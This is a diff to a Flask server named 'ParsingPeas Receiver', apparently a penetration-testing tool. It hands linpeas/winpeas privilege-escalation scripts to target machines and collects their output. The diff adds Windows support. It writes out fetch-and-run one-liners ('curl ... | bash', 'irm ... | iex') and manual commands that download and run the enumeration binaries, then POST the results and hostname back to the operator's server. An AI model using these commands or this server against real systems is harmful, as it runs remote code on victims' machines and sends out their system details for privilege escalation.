@@ -105,14 +105,28 @@ def index():
         
         <hr>
         <h3>Usage:</h3>
-        <p><strong>Linux targets:</strong></p>
+        
+        <p><strong>🐧 Linux/macOS targets:</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
 curl -sSL http://{request.host}/get-script | bash
         </code>
         
-        <p><strong>Or manual:</strong></p>
+        <p><strong>🪟 Windows targets (PowerShell):</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+irm http://{request.host}/get-script.ps1 | iex
+        </code>
+        
+        <hr>
+        <h3>Manual Commands:</h3>
+        
+        <p><strong>Linux (manual):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
 curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H "X-Hostname: $(hostname)" http://{request.host}/upload
+        </code>
+        
+        <p><strong>Windows (manual):</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+$r=irm http://{request.host}/get-winpeas -OutFile $env:TEMP\w.exe; & $env:TEMP\w.exe | Out-File $env:TEMP\o.txt; irm http://{request.host}/upload -Method POST -InFile $env:TEMP\o.txt -Headers @{{"X-Hostname"=$env:COMPUTERNAME}}
         </code>
     </body>
     </html>
@@ -128,13 +142,24 @@ def serve_test():
 
 @app.route('/get-script')
 def get_script():
-    """Serve the wrapper script to target machine"""
-    log(f"[→] Serving wrapper script to {request.remote_addr}")
+    """Serve the wrapper script (bash) to target machine"""
+    log(f"[→] Serving wrapper.sh to {request.remote_addr}")
     with open('wrapper.sh', 'r') as f:
         script = f.read()
     # Replace placeholder with actual server URL
     script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
     return script, 200, {'Content-Type': 'text/plain'}
+
+
+@app.route('/get-script.ps1')
+def get_script_ps1():
+    """Serve the wrapper script (PowerShell) to target machine"""
+    log(f"[→] Serving wrapper.ps1 to {request.remote_addr}")
+    with open('wrapper.ps1', 'r', encoding='utf-8') as f:
+        script = f.read()
+    # Replace placeholder with actual server URL
+    script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
+    return script, 200, {'Content-Type': 'text/plain; charset=utf-8'}
 
 
 @app.route('/get-linpeas')
@@ -267,8 +292,9 @@ def health():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════╗
-    ║       ParsingPeas Receiver v1.0       ║
+    ║       ParsingPeas Receiver v1.1       ║
     ║   Automated linpeas/winpeas Parser    ║
+    ║    🐧 Linux  |  🪟 Windows Support    ║
     ╚═══════════════════════════════════════╝
     """)
     log(f"[+] Output directory: {OUTPUT_DIR}")
@@ -280,7 +306,8 @@ if __name__ == '__main__':
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Target usage: curl -sSL http://YOUR_IP:8000/get-script | bash\n")
+    log(f"[+] Linux targets:   curl -sSL http://YOUR_IP:8000/get-script | bash")
+    log(f"[+] Windows targets: irm http://YOUR_IP:8000/get-script.ps1 | iex\n")
     log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
